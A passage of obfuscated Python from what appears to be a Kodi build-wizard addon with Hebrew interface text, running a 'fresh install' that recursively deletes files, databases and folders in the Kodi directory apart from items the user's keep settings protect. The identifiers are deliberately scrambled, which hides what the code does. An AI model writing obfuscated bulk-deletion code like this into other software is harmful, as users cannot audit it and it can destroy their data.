						EXCLUDES .append (O000OO0OOOO00O0O0 )#line:5316
				if not O0OO00O0O000OOOOO =='':wiz .setS ('pvrclient',O000OO0OOOO00O0O0 )#line:5317
		if wiz .getS ('pvrclient')=='':#line:5318
			for OOOO0000O0OOO0OO0 in EXCLUDES :#line:5319
				if OOOO0000O0OOO0OO0 .startswith ('pvr'):#line:5320
					wiz .setS ('pvrclient',OOOO0000O0OOO0OO0 )#line:5321
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5322
		OO0OO0OOO0O00000O =wiz .latestDB ('Addons')#line:5323
		for O00OO0O00OOOOO00O ,OOOOO00O0O0OO0O00 ,O000OO000OO00O0O0 in os .walk (OO0000O0000OOOO00 ,topdown =True ):#line:5324
			OOOOO00O0O0OO0O00 [:]=[O0O0O0O00O00OO0O0 for O0O0O0O00O00OO0O0 in OOOOO00O0O0OO0O00 if O0O0O0O00O00OO0O0 not in EXCLUDES ]#line:5325
			for OOOO0O0O00O0O00OO in O000OO000OO00O0O0 :#line:5326
				OOOO0000OO0O00O0O +=1 #line:5327
				O000OO0OOOO00O0O0 =O00OO0O00OOOOO00O .replace ('/','\\').split ('\\')#line:5328
				O000OOO00OO0OO000 =len (O000OO0OOOO00O0O0 )-1 #line:5330
				if O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5331
				elif OOOO0O0O00O0O00OO =='MyVideos99.db'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5332
				elif OOOO0O0O00O0O00OO =='MyVideos107.db'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5333
				elif OOOO0O0O00O0O00OO =='MyVideos116.db'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5334
				elif OOOO0O0O00O0O00OO =='MyVideos99.db'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5335
				elif OOOO0O0O00O0O00OO =='MyVideos107.db'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5336
				elif OOOO0O0O00O0O00OO =='MyVideos116.db'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5337
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5338
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'skin.anonymous.mod'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5339
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'skin.Premium.mod'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5340
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'skin.anonymous.nox'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5341
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'skin.phenomenal'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5342
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.metalliq'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5343
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'skin.titan'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5345
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'pvr.iptvsimple'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5346
				elif OOOO0O0O00O0O00OO =='sources.xml'and O000OO0OOOO00O0O0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5348
				elif OOOO0O0O00O0O00OO =='quicknav.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5351
				elif OOOO0O0O00O0O00OO =='x1101.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5352
				elif OOOO0O0O00O0O00OO =='b-srtym-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5353
				elif OOOO0O0O00O0O00OO =='x1102.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5354
				elif OOOO0O0O00O0O00OO =='b-sdrvt-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5355
				elif OOOO0O0O00O0O00OO =='x1112.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5356
				elif OOOO0O0O00O0O00OO =='b-tlvvyzyh-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5357
				elif OOOO0O0O00O0O00OO =='x1111.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5358
				elif OOOO0O0O00O0O00OO =='b-tvknyshrly-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5359
				elif OOOO0O0O00O0O00OO =='x1110.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5360
				elif OOOO0O0O00O0O00OO =='b-yldym-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5361
				elif OOOO0O0O00O0O00OO =='x1114.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5362
				elif OOOO0O0O00O0O00OO =='b-mvzyqh-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5363
				elif OOOO0O0O00O0O00OO =='mainmenu.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5364
				elif OOOO0O0O00O0O00OO =='skin.Premium.mod.properties'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5365
				elif OOOO0O0O00O0O00OO =='x1122.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5367
				elif OOOO0O0O00O0O00OO =='b-spvrt-b.DATA.xml'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5368
				elif OOOO0O0O00O0O00OO =='favourites.xml'and O000OO0OOOO00O0O0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5373
				elif OOOO0O0O00O0O00OO =='guisettings.xml'and O000OO0OOOO00O0O0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5375
				elif OOOO0O0O00O0O00OO =='profiles.xml'and O000OO0OOOO00O0O0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5376
				elif OOOO0O0O00O0O00OO =='advancedsettings.xml'and O000OO0OOOO00O0O0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5377
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5378
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'program.apollo'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5379
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5380
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.telemedia'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5381
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.elementum'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5384
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5386
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'weather.yahoo'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5387
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.quasar'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5388
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'program.apollo'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5389
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5390
				elif O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -2 ]=='userdata'and O000OO0OOOO00O0O0 [O000OOO00OO0OO000 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O000OO0OOOO00O0O0 [O000OOO00OO0OO000 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5391
				elif OOOO0O0O00O0O00OO in LOGFILES :wiz .log ("Keep Log File: %s"%OOOO0O0O00O0O00OO ,xbmc .LOGNOTICE )#line:5392
				elif OOOO0O0O00O0O00OO .endswith ('.db'):#line:5393
					try :#line:5394
						if OOOO0O0O00O0O00OO ==OO0OO0OOO0O00000O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOOO0O0O00O0O00OO ,KODIV ),xbmc .LOGNOTICE )#line:5395
						else :os .remove (os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ))#line:5396
					except Exception as O0O0OO0000O0OOOOO :#line:5397
						if not OOOO0O0O00O0O00OO .startswith ('Textures13'):#line:5398
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5399
							wiz .log ("-> %s"%(str (O0O0OO0000O0OOOOO )),xbmc .LOGNOTICE )#line:5400
							wiz .purgeDb (os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ))#line:5401
				else :#line:5402
					DP .update (int (wiz .percentage (OOOO0000OO0O00O0O ,OO0000000OO0O0O0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O0O00O0O00OO ),'')#line:5403
					try :os .remove (os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ))#line:5404
					except Exception as O0O0OO0000O0OOOOO :#line:5405
						wiz .log ("Error removing %s"%os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),xbmc .LOGNOTICE )#line:5406
						wiz .log ("-> / %s"%(str (O0O0OO0000O0OOOOO )),xbmc .LOGNOTICE )#line:5407
			if DP .iscanceled ():#line:5408
				DP .close ()#line:5409
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5410
				return False #line:5411
		for O00OO0O00OOOOO00O ,OOOOO00O0O0OO0O00 ,O000OO000OO00O0O0 in os .walk (OO0000O0000OOOO00 ,topdown =True ):#line:5412
			OOOOO00O0O0OO0O00 [:]=[O00OOOOOO00O00O0O for O00OOOOOO00O00O0O in OOOOO00O0O0OO0O00 if O00OOOOOO00O00O0O not in EXCLUDES ]#line:5413
			for OOOO0O0O00O0O00OO in OOOOO00O0O0OO0O00 :#line:5414
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0O0O00O0O00OO ),'')#line:5415
			  if OOOO0O0O00O0O00OO not in ["Database","userdata","temp","addons","addon_data"]:#line:5416
			   if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5417
			    if not (OOOO0O0O00O0O00OO =='skin.titan'and KEEPSKIN3 =='true'):#line:5419
			      if not (OOOO0O0O00O0O00OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5420
			       if not (OOOO0O0O00O0O00OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5421
			        if not (OOOO0O0O00O0O00OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5422
			         if not (OOOO0O0O00O0O00OO =='program.apollo'and KEEPINFO =='true'):#line:5423
			          if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5424
			           if not (OOOO0O0O00O0O00OO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5425
			            if not (OOOO0O0O00O0O00OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5426
			             if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5427
			              if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5428
			               if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5429
			                if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5430
			                 if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5431
			                  if not (OOOO0O0O00O0O00OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5432
			                   if not (OOOO0O0O00O0O00OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5433
			                    if not (OOOO0O0O00O0O00OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5434
			                     if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5435
			                      if not (OOOO0O0O00O0O00OO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5436
			                       if not (OOOO0O0O00O0O00OO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5437
			                           if not (OOOO0O0O00O0O00OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5441
			                            if not (OOOO0O0O00O0O00OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5442
			                             if not (OOOO0O0O00O0O00OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5443
			                              if not (OOOO0O0O00O0O00OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5444
			                               if not (OOOO0O0O00O0O00OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5445
			                                  shutil .rmtree (os .path .join (O00OO0O00OOOOO00O ,OOOO0O0O00O0O00OO ),ignore_errors =True ,onerror =None )#line:5447
			if DP .iscanceled ():#line:5448
				DP .close ()#line:5449
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5450
				return False #line:5451
		DP .close ()#line:5452
		wiz .clearS ('build')#line:5453
		if over ==True :#line:5454
			return True #line:5455
		elif install =='restore':#line:5456
			return True #line:5457
		elif install :#line:5458
			buildWizard (install ,'normal',over =True )#line:5459
		else :#line:5460
			if INSTALLMETHOD ==1 :OOOOOOOOO0OOO00OO =1 #line:5461
			elif INSTALLMETHOD ==2 :OOOOOOOOO0OOO00OO =0 #line:5462
			else :OOOOOOOOO0OOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5463
			if OOOOOOOOO0OOO00OO ==1 :wiz .reloadFix ('fresh')#line:5464
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5465
	else :#line:5466
		if not install =='restore':#line:5467
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5468
			wiz .refresh ()#line:5469
def clearCache ():#line:5474
		wiz .clearCache ()#line:5475
def fixwizard ():#line:5479
		wiz .fixwizard ()#line:5480
def totalClean ():#line:5482
